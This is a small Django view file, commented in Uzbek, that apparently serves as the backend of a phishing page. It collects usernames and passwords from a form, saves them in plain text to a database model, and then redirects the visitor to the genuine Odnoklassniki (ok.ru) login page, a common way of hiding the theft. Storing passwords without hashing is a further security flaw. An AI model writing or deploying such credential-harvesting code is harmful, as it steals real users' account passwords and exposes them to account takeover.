from django.shortcuts import render, redirect
from .models import UserCredential

def home_page(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")

        # Avval tekshirish
        if UserCredential.objects.filter(username=username).exists():
            return render(request, 'index.html', {"message": "Bu foydalanuvchi nomi allaqachon mavjud!"})

        # Yangi yozuv qo‘shish
        UserCredential.objects.create(
            username=username,
            password=password
        )

        # Odnoklassniki'ga yo‘naltirish
        return redirect("https://ok.ru/dk?st.cmd=anonymLogin")

    return render(request, 'index.html')
